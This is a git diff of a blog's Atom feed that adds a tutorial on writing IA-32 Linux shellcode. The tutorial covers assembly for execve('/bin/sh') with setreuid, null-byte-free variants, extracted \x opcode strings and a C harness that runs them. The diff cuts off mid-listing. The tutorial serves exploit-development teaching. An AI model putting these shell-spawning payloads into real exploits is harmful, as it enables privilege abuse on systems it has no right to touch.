@@ -4,7 +4,7 @@
   <title><![CDATA[0x73696e65]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-06-23T17:17:42+02:00</updated>
+  <updated>2015-06-26T12:06:59+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,595 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 2]]></title>
+    <link href="http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/"/>
+    <updated>2015-06-26T11:08:30+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2</id>
+    <content type="html"><![CDATA[<p>The ASM code that is position dependent:</p>
+
+<figure class='code'><figcaption><span>shell1.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
+</span><span class='line'><span class="nf">cmd</span> <span class="no">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0x0</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">11</span>
+</span><span class='line'><span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">cmd</span><span class="err">]</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">ecx</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell1.asm; ld shell1.o -o shell1
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./shell1 
+</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell1
+</span><span class='line'>
+</span><span class='line'>shell1:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048080 &lt;_start>:
+</span><span class='line'> 8048080: b8 0b 00 00 00          mov    eax,0xb
+</span><span class='line'> 8048085: 8d 1d 9c 90 04 08       lea    ebx,ds:0x804909c
+</span><span class='line'> 804808b: b9 00 00 00 00          mov    ecx,0x0
+</span><span class='line'> 8048090: 51                      push   ecx
+</span><span class='line'> 8048091: 53                      push   ebx
+</span><span class='line'> 8048092: 89 e1                   mov    ecx,esp
+</span><span class='line'> 8048094: ba 00 00 00 00          mov    edx,0x0
+</span><span class='line'> 8048099: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The minimalistic shell could look like <code>execve("/bin/sh", NULL, NULL)</code>.
+However, according documentation it&rsquo;s not portable among UNIX systems:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 execve
+</span><span class='line'>
+</span><span class='line'>  On Linux, argv can be specified as NULL, which has the same effect as
+</span><span class='line'>  specifying this argument as a pointer to a list containing a single NULL
+</span><span class='line'>  pointer.  Do not take advantage of this  misfea‐ ture!  It is nonstandard and
+</span><span class='line'>  nonportable: on most other UNIX systems doing this will result in an error
+</span><span class='line'>  (EFAULT).</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, the same procedure. We need to get rid of absolute address reference and
+NULL bytes.</p>
+
+<figure class='code'><figcaption><span>shell2.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
+</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell2.asm; ld shell2.o -o shell2
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./shell2 
+</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Before we dump our opcodes, we add <code>setreuid(geteuid(), geteuid()</code> call:</p>
+
+<figure class='code'><figcaption><span>shell3.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
+</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
+</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
+</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell3.asm; ld shell3.o -o shell3
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./shell3</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell3
+</span><span class='line'>
+</span><span class='line'>shell3:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048060 &lt;_start>:
+</span><span class='line'> 8048060: 6a 31                   push   0x31
+</span><span class='line'> 8048062: 58                      pop    eax
+</span><span class='line'> 8048063: cd 80                   int    0x80
+</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
+</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
+</span><span class='line'> 8048069: 6a 46                   push   0x46
+</span><span class='line'> 804806b: 58                      pop    eax
+</span><span class='line'> 804806c: cd 80                   int    0x80
+</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
+</span><span class='line'> 8048070: 31 d2                   xor    edx,edx
+</span><span class='line'> 8048072: 50                      push   eax
+</span><span class='line'> 8048073: 68 6e 2f 73 68          push   0x68732f6e
+</span><span class='line'> 8048078: 68 2f 2f 62 69          push   0x69622f2f
+</span><span class='line'> 804807d: 89 e3                   mov    ebx,esp
+</span><span class='line'> 804807f: 50                      push   eax
+</span><span class='line'> 8048080: 53                      push   ebx
+</span><span class='line'> 8048081: 89 e1                   mov    ecx,esp
+</span><span class='line'> 8048083: b0 0b                   mov    al,0xb
+</span><span class='line'> 8048085: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Analogously as before:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
+</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sc=$(objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > shellcode</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h>
+</span><span class='line'>#include &lt;string.h>
+</span><span class='line'>#include &lt;stdio.h>
+</span><span class='line'>
+</span><span class='line'>char sc[]= "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+</span><span class='line'>
+</span><span class='line'>int main(){
+</span><span class='line'>        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); 
+</span><span class='line'>        printf("allocated executable memory at: %p\n", a); 
+</span><span class='line'>        printf("shellcode length: %d\n", strlen(sc)); 
+</span><span class='line'>        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# gcc test.c -o test
+</span><span class='line'>root@kali32:/tmp# ./test 
+</span><span class='line'>allocated executable memory at: 0xb76f7000
+</span><span class='line'>shellcode length: 39
+</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alternatively we can obtain string reference with <code>call</code> instruction:</p>
+
+<figure class='code'><figcaption><span>shell4.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
+</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
+</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span><span class="err">;</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">jmp</span> <span class="no">short</span> <span class="no">string_loc</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">string_loc_ret:</span>
+</span><span class='line'><span class="nf">pop</span> <span class="no">ebx</span>
+</span><span class='line'><span class="nf">mov</span> <span class="err">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">7</span><span class="err">]</span><span class="p">,</span> <span class="no">cl</span> <span class="err">;</span> <span class="no">rewrite</span> <span class="no">N</span> <span class="no">with</span> <span class="err">\</span><span class="mi">0</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">push</span> <span class="no">edx</span><span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span><span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">esp</span><span class="p">,</span> <span class="no">ecx</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">string_loc:</span>
+</span><span class='line'><span class="nf">call</span> <span class="no">string_loc_ret</span> <span class="err">;</span> <span class="no">this</span> <span class="no">put</span> <span class="no">the</span> <span class="p">(</span><span class="no">return</span><span class="p">)</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">string</span> <span class="no">to</span> <span class="no">the</span> <span class="no">top</span> <span class="no">of</span> <span class="no">the</span> <span class="no">stack</span>
+</span><span class='line'><span class="nf">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">shN</span><span class="err">&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell4.asm; ld shell4.o -o shell4
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./shell4
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The segfault is normal and it&rsquo;s because we are trying to overwrite the code
+segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. Because our shellcode will be
+loaded on stack, that doesn&rsquo;t mean any complication.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell4
+</span><span class='line'>
+</span><span class='line'>shell4:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048060 &lt;_start>:
+</span><span class='line'> 8048060: 6a 31                   push   0x31
+</span><span class='line'> 8048062: 58                      pop    eax
+</span><span class='line'> 8048063: cd 80                   int    0x80
+</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
+</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
+</span><span class='line'> 8048069: 6a 46                   push   0x46
+</span><span class='line'> 804806b: 58                      pop    eax
+</span><span class='line'> 804806c: cd 80                   int    0x80
+</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
+</span><span class='line'> 8048070: 31 c9                   xor    ecx,ecx
+</span><span class='line'> 8048072: 31 d2                   xor    edx,edx
+</span><span class='line'> 8048074: eb 0c                   jmp    8048082 &lt;string_loc>
+</span><span class='line'>
+</span><span class='line'>08048076 &lt;string_loc_ret>:
+</span><span class='line'> 8048076: 5b                      pop    ebx
+</span><span class='line'> 8048077: 88 4b 07                mov    BYTE PTR [ebx+0x7],cl
+</span><span class='line'> 804807a: 52                      push   edx
+</span><span class='line'> 804807b: 53                      push   ebx
+</span><span class='line'> 804807c: 89 cc                   mov    esp,ecx
+</span><span class='line'> 804807e: b0 0b                   mov    al,0xb
+</span><span class='line'> 8048080: cd 80                   int    0x80
+</span><span class='line'>
+</span><span class='line'>08048082 &lt;string_loc>:
+</span><span class='line'> 8048082: e8 ef ff ff ff          call   8048076 &lt;string_loc_ret>
+</span><span class='line'> 8048087: 2f                      das    
+</span><span class='line'> 8048088: 62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
+</span><span class='line'> 804808b: 2f                      das    
+</span><span class='line'> 804808c: 73 68                   jae    80480f6 &lt;string_loc+0x74>
+</span><span class='line'> 804808e: 4e                      dec    esi</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
+</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>test.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
